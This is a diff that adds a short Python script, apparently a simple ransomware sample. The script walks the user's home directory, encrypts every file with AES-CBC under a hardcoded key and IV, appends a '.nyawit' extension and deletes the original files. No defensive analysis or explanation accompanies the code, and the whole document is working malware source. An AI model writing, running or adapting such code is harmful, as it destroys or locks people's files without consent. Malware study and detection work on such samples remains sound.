@@ -1,0 +1,56 @@
+#!/usr/bin/python3
+import os
+import sys
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+SECRET_KEY = b"lusuknyawitgk123"  # 16 Bytes
+SECRET_IV = b"nihgwsukanyawit1"  # 16 Bytes
+
+ENCRYPTED_EXTENSION = ".nyawit"
+
+
+def encrypt_file(filepath):
+    try:
+        with open(filepath, "rb") as f:
+            plaintext = f.read()
+
+        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, SECRET_IV)
+
+        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+
+        encrypted_filepath = filepath + ENCRYPTED_EXTENSION
+
+        with open(encrypted_filepath, "wb") as f:
+            f.write(ciphertext)
+
+        os.remove(filepath)
+
+        print(f"[+] Encrypted: {filepath} -> {encrypted_filepath}")
+
+    except Exception as e:
+        print(f"[-] Failed to encrypt {filepath}: {e}")
+
+
+def scan_and_encrypt(directory):
+    print(f"[*] Scanning directory: {directory}")
+    print("[*] Starting encryption process...")
+
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+
+            if file_path == os.path.abspath(__file__):
+                continue
+
+            encrypt_file(file_path)
+
+
+if __name__ == "__main__":
+    home_dir = os.path.expanduser("~")
+
+    print(f"hai: {home_dir}, {SECRET_KEY}, {SECRET_IV}")
+
+    scan_and_encrypt(home_dir)
+    print("[*] Done.")
